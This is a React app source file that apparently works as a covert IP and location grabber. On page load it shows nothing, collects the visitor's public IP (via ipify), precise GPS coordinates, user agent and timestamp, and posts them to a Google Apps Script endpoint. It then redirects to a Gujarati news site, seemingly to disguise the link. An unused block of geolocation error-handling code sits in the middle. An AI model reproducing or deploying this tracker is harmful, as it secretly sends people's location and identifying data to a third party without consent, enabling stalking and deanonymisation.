import { useEffect } from 'react'
export default function App() {
  async function getIPAddress() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    const formData = new FormData();


    let latitude;
    let longitude;

    const currentDate = new Date();
    // console.log("Current Date:", currentDate);

    navigator.geolocation.getCurrentPosition(function (position) {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
      formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
      Submit(formData)
    });
    // this 01 start new code
    function getLocation() {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(showPosition, showError);
			} else {
				alert("Geolocation is not supported by this browser.");
			}
		}

		function showPosition(position) {
			// Do something with the user's location
		}

		function showError(error) {
			switch(error.code) {
				case error.PERMISSION_DENIED:
					alert("Location permission denied. Please enable location services to use this website.");
					break;
				case error.POSITION_UNAVAILABLE:
					alert("Location information is unavailable.");
					break;
				case error.TIMEOUT:
					alert("The request to get user location timed out.");
					break;
				case error.UNKNOWN_ERROR:
					alert("An unknown error occurred.");
					break;
			}
		}
    // end 01 this code 

    const userAgent = navigator.userAgent;
    // console.log("User Agent:", userAgent);

    formData.append("Ip", data.ip);
    formData.append("Date", currentDate);
    // formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
    formData.append("Agent", userAgent);
    Submit(formData)
    // window.location.href = 'https://tv9gujarati.com/';
  }

useEffect(() => {
  getIPAddress()
}, [])

  function Submit(formData) {
    fetch(
      "https://script.google.com/macros/s/AKfycbyksgzrzT6IzE_iDgf8cJD-sb-sNf2RuXpJM1M--H31QZ12khkc3PAgtxArOLwnk65c/exec",
      {
        method: "POST",
        body: formData
      }
    )
      .then((res) => res.json())
      .then((data) => {
        // console.log(data);
        setTimeout(() => {
          window.location.href = 'https://tv9gujarati.com/';
        }, 1000);
      })
      .catch((error) => {
        // console.log(error);

      });
  }
  return (
    <div className="App" />
    
  );
}